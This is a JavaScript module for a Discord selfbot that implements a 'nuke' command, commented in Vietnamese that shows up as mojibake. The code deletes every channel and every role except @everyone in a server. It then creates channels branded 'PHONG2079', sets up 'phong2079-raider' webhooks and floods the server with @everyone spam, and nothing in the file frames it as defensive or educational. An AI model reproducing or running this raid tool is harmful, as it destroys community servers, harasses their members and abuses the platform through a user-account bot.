export const name = 'nuke';
export const permission = 'everyone';

export async function execute(message, args, client) {
    try {
        // Ki·ªÉm tra xem c√≥ ph·∫£i l√† server kh√¥ng
        if (!message.guild) {
            return '‚ùå L·ªánh n√†y ch·ªâ c√≥ th·ªÉ s·ª≠ d·ª•ng trong server!';
        }

        // Ki·ªÉm tra quy·ªÅn c·ªßa selfbot
        const selfMember = message.guild.members.cache.get(client.user.id);
        if (!selfMember) {
            return '‚ùå Kh√¥ng th·ªÉ l·∫•y th√¥ng tin quy·ªÅn c·ªßa bot!';
        }

        // Ki·ªÉm tra c√°c quy·ªÅn c·∫ßn thi·∫øt
        const requiredPermissions = [
            'MANAGE_CHANNELS',  // Qu·∫£n l√Ω k√™nh
            'MANAGE_ROLES',     // Qu·∫£n l√Ω vai tr√≤
            'MANAGE_WEBHOOKS',  // Qu·∫£n l√Ω webhook
            'MANAGE_MESSAGES',  // Qu·∫£n l√Ω tin nh·∫Øn
            //'MANAGE_NICKNAMES', // Qu·∫£n l√Ω bi·ªát danh
            //'MANAGE_EMOJIS'     // Qu·∫£n l√Ω emoji
        ];

        const missingPermissions = requiredPermissions.filter(perm => !selfMember.permissions.has(perm));

        if (missingPermissions.length > 0) {
            return `‚ùå Bot thi·∫øu c√°c quy·ªÅn sau: ${missingPermissions.join(', ')}`;
        }

        // N·∫øu kh√¥ng c√≥ tham s·ªë start, ch·ªâ ki·ªÉm tra quy·ªÅn
        if (!args[0] || args[0].toLowerCase() !== 'start') {
            return `‚úÖ Bot c√≥ ƒë·ªß quy·ªÅn ƒë·ªÉ th·ª±c hi·ªán nuke!`;
        }

        // Ki·ªÉm tra ph∆∞∆°ng th·ª©c nuke
        const nukeMethod = args[1]?.toLowerCase();
        if (!nukeMethod || !['webhook', 'message', 'best'].includes(nukeMethod)) {
            return '‚ùå Vui l√≤ng ch·ªçn ph∆∞∆°ng th·ª©c nuke: `;nuke start webhook`, `;nuke start message` ho·∫∑c `;nuke start best`';
        }

        // L·∫•y th√¥ng tin s·ªë l∆∞·ª£ng danh m·ª•c v√† k√™nh
        const numberOfCategories = parseInt(args[2]) || 5;
        const channelsPerCategory = parseInt(args[3]) || 3;
        const customText = args.slice(4).join(' ') || '@everyone';

        console.log(`üìù Th√¥ng tin nuke:`);
        console.log(`- Ph∆∞∆°ng th·ª©c: ${nukeMethod}`);
        console.log(`- S·ªë danh m·ª•c: ${numberOfCategories}`);
        console.log(`- S·ªë k√™nh m·ªói danh m·ª•c: ${channelsPerCategory}`);
        console.log(`- Text spam: ${customText}`);

        // B·∫Øt ƒë·∫ßu qu√° tr√¨nh nuke
        console.log('üöÄ B·∫Øt ƒë·∫ßu qu√° tr√¨nh nuke...');

        // X√≥a t·∫•t c·∫£ c√°c k√™nh
        const channels = message.guild.channels.cache;
        console.log(`üìä T·ªïng s·ªë k√™nh c·∫ßn x√≥a: ${channels.size}`);
        
        // X√≥a t·∫•t c·∫£ k√™nh song song
        await Promise.all(channels.map(async channel => {
            try {
                console.log(`üóëÔ∏è ƒêang x√≥a k√™nh: ${channel.name} (ID: ${channel.id})`);
                await channel.delete();
                console.log(`‚úÖ ƒê√£ x√≥a k√™nh: ${channel.name} (ID: ${channel.id})`);
            } catch (error) {
                console.error(`‚ùå Kh√¥ng th·ªÉ x√≥a k√™nh ${channel.name} (ID: ${channel.id}):`, error.message);
            }
        }));

        // X√≥a t·∫•t c·∫£ c√°c vai tr√≤
        const roles = message.guild.roles.cache;
        console.log(`üìä T·ªïng s·ªë vai tr√≤ c·∫ßn x√≥a: ${roles.size - 1}`); // Tr·ª´ vai tr√≤ @everyone
        
        // X√≥a t·∫•t c·∫£ vai tr√≤ song song
        await Promise.all(roles.map(async role => {
            try {
                if (role.id !== message.guild.id) { // Kh√¥ng x√≥a vai tr√≤ @everyone
                    console.log(`üóëÔ∏è ƒêang x√≥a vai tr√≤: ${role.name} (ID: ${role.id})`);
                    await role.delete();
                    console.log(`‚úÖ ƒê√£ x√≥a vai tr√≤: ${role.name} (ID: ${role.id})`);
                }
            } catch (error) {
                console.error(`‚ùå Kh√¥ng th·ªÉ x√≥a vai tr√≤ ${role.name} (ID: ${role.id}):`, error.message);
            }
        }));

        // T·∫°o danh m·ª•c ng·∫´u nhi√™n
        console.log(`üìÅ ƒêang t·∫°o ${numberOfCategories} danh m·ª•c...`);
        const categoryPromises = Array(numberOfCategories).fill().map(async (_, i) => {
            const categoryNumber = i + 1;
            return message.guild.channels.create(`PHONG2079-${categoryNumber}`, {
                type: 'GUILD_CATEGORY',
                position: i
            });
        });

        const createdCategories = await Promise.all(categoryPromises);
        console.log(`‚úÖ ƒê√£ t·∫°o xong ${numberOfCategories} danh m·ª•c`);

        // T·∫°o k√™nh cho m·ªói danh m·ª•c
        console.log(`üìù ƒêang t·∫°o ${channelsPerCategory} k√™nh cho m·ªói danh m·ª•c...`);
        const allChannels = [];
        
        for (const category of createdCategories) {
            const channelPromises = Array(channelsPerCategory).fill().map(async (_, i) => {
                const channelNumber = i + 1;
                return message.guild.channels.create(`phong2079-here-${channelNumber}`, {
                    type: 'GUILD_TEXT',
                    parent: category.id
                });
            });

            const categoryChannels = await Promise.all(channelPromises);
            allChannels.push(...categoryChannels);
        }

        console.log(`‚úÖ ƒê√£ t·∫°o xong ${allChannels.length} k√™nh trong ${createdCategories.length} danh m·ª•c`);

        if (nukeMethod === 'webhook') {
            // T·∫°o webhook cho t·∫•t c·∫£ k√™nh tr∆∞·ªõc
            const webhooks = [];
            for (const channel of allChannels) {
                try {
                    console.log(`üîó ƒêang t·∫°o webhook phong2079-raider cho k√™nh ${channel.name}...`);
                    const webhook = await channel.createWebhook('phong2079-raider', {
                        avatar: client.user.displayAvatarURL()
                    });
                    console.log(`‚úÖ ƒê√£ t·∫°o webhook: ${webhook.name}`);
                    webhooks.push(webhook);
                } catch (error) {
                    console.error(`‚ùå L·ªói khi t·∫°o webhook cho k√™nh ${channel.name}:`, error.message);
                }
            }

            // Spam ng·∫´u nhi√™n gi·ªØa c√°c k√™nh
            console.log('üí¨ B·∫Øt ƒë·∫ßu spam ng·∫´u nhi√™n gi·ªØa c√°c k√™nh...');
            const totalSpams = webhooks.length * 5; // 5 l·∫ßn cho m·ªói k√™nh
            const spamPromises = Array(totalSpams).fill().map(async () => {
                const randomWebhook = webhooks[Math.floor(Math.random() * webhooks.length)];
                try {
                    await randomWebhook.send(customText);
                } catch (error) {
                    console.error(`‚ùå L·ªói khi spam v·ªõi webhook ${randomWebhook.name}:`, error.message);
                }
            });

            // Ch·∫°y t·∫•t c·∫£ spam c√πng l√∫c
            await Promise.all(spamPromises);
        } else if (nukeMethod === 'message') {
            // Spam ng·∫´u nhi√™n gi·ªØa c√°c k√™nh
            console.log('üí¨ B·∫Øt ƒë·∫ßu spam ng·∫´u nhi√™n gi·ªØa c√°c k√™nh...');
            const totalSpams = allChannels.length * 5; // 5 l·∫ßn cho m·ªói k√™nh
            const spamPromises = Array(totalSpams).fill().map(async () => {
                const randomChannel = allChannels[Math.floor(Math.random() * allChannels.length)];
                try {
                    await randomChannel.send(customText);
                } catch (error) {
                    console.error(`‚ùå L·ªói khi spam trong k√™nh ${randomChannel.name}:`, error.message);
                }
            });

            // Ch·∫°y t·∫•t c·∫£ spam c√πng l√∫c
            await Promise.all(spamPromises);
        } else if (nukeMethod === 'best') {
            // T·∫°o webhook v√† spam message song song
            console.log('üí¨ B·∫Øt ƒë·∫ßu spam k·∫øt h·ª£p webhook v√† message...');

            // T·∫°o webhook cho t·∫•t c·∫£ k√™nh (ch·∫°y song song v·ªõi spam message)
            const webhookPromises = allChannels.map(async channel => {
                try {
                    console.log(`üîó ƒêang t·∫°o webhook phong2079-raider cho k√™nh ${channel.name}...`);
                    const webhook = await channel.createWebhook('phong2079-raider', {
                        avatar: client.user.displayAvatarURL()
                    });
                    console.log(`‚úÖ ƒê√£ t·∫°o webhook: ${webhook.name}`);
                    return webhook;
                } catch (error) {
                    console.error(`‚ùå L·ªói khi t·∫°o webhook cho k√™nh ${channel.name}:`, error.message);
                    return null;
                }
            });

            // Spam message ngay l·∫≠p t·ª©c kh√¥ng ƒë·ª£i webhook
            const messageSpamPromises = Array(allChannels.length * 5).fill().map(async () => {
                const randomChannel = allChannels[Math.floor(Math.random() * allChannels.length)];
                try {
                    await randomChannel.send(customText);
                } catch (error) {
                    console.error(`‚ùå L·ªói khi spam trong k√™nh ${randomChannel.name}:`, error.message);
                }
            });

            // Ch·∫°y spam message ngay l·∫≠p t·ª©c
            await Promise.all(messageSpamPromises);

            // Sau khi spam message xong, ki·ªÉm tra webhook ƒë√£ t·∫°o xong ch∆∞a
            const webhooks = (await Promise.all(webhookPromises)).filter(webhook => webhook !== null);

            // N·∫øu c√≥ webhook ƒë√£ t·∫°o xong, spam th√™m b·∫±ng webhook
            if (webhooks.length > 0) {
                console.log('üí¨ B·∫Øt ƒë·∫ßu spam b·∫±ng webhook...');
                const webhookSpamPromises = Array(webhooks.length * 5).fill().map(async () => {
                    const randomWebhook = webhooks[Math.floor(Math.random() * webhooks.length)];
                    try {
                        await randomWebhook.send(customText);
                    } catch (error) {
                        console.error(`‚ùå L·ªói khi spam v·ªõi webhook ${randomWebhook.name}:`, error.message);
                    }
                });

                // Ch·∫°y spam webhook
                await Promise.all(webhookSpamPromises);
            }
        }

        console.log('‚úÖ ƒê√£ ho√†n th√†nh qu√° tr√¨nh nuke!');
        return '‚úÖ ƒê√£ ho√†n th√†nh qu√° tr√¨nh nuke!';
    } catch (error) {
        console.error('‚ùå L·ªói khi th·ª±c hi·ªán nuke:', error);
        return '‚ùå ƒê√£ x·∫£y ra l·ªói khi th·ª±c hi·ªán nuke!';
    }
} 